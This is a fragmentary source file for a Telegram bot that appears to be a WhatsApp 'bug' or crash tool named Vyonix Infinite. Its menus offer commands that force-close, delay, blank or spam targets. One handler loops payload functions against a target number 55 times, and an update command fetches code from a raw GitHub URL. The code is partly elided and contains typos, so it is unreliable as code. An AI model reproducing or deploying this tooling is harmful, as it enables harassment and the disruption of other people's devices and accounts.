...
bot.start(ctx => {
    ...
    const menuMessage = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗬𝗢𝗡𝗜𝗫 ℵ 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗬𝗢𝗡𝗜𝗫 ℵ 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.1
...
<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>`;
 ...
 icon_custom_emoji_id: "5357317569650911348"
        ...
        [
            ...
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/KinggVeltrix", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ],
        [
            {
...
bot.action('/controls', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗬𝗢𝗡𝗜𝗫 ℵ 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。
...
┊✦ /cekupdate → Check Update Script
┊✦ /rasuk → Rasuk Bot Father
┊✦ /cekerror → Cek Error File.js
──────────────────────────</blockquote>`;
...
bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗬𝗢𝗡𝗜𝗫 ℵ 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。
...
<blockquote>──────────────────────────
#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 ⌟
┊✦ /Xbug - Vyonix To Forclose
┊✦ /Xspam - Vyonix To Delay
┊✦ /xblank - Vyonix To Blank
┊✦ /117 -  Vyonix To Combo
...
bot.action('/upharga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗛𝗢𝗩𝗘𝗟𝗬 - 𝗙𝗟𝗢𝗪𝗘𝗥 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。
...
bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗬𝗢𝗡𝗜𝗫 ℵ 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。
...
<blockquote>──────────────────────────
#- ⌜ 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 ⌟
┊✦ /MurbugX - Khusus Murbug
┊✦ /MurbugV - Khusus Murbug
──────────────────────────</blockquote>`;
...
// ================= CONFIG =================
const RAW_URL = "https://raw.githubusercontent.com/Ditzy99/Ditzy123/main/hovely.js";
...
bot.command("update", async (ctx) => {
 ...
 await ctx.reply("♨️ 𝗩𝗬𝗢𝗡𝗜𝗫 - 𝗟𝗢𝗔𝗗𝗜𝗡𝗚...");
...
//CASE BUG DISINI \\
bot.command("inTs", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
...
╰➤ Exploit Proses Kirim...
 ...
 ▢ Type: Bebas Spam
  ...
  for (let i = 0; i < 55; i++) {
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    awaiy xryyimagexdoc(sock, target);
    await sleep(1000);
  }
...
async function xryyimagexdoc(sock, target) {
  try {
    const generateId = () => Math.random().toString(36).substring(2, 15);
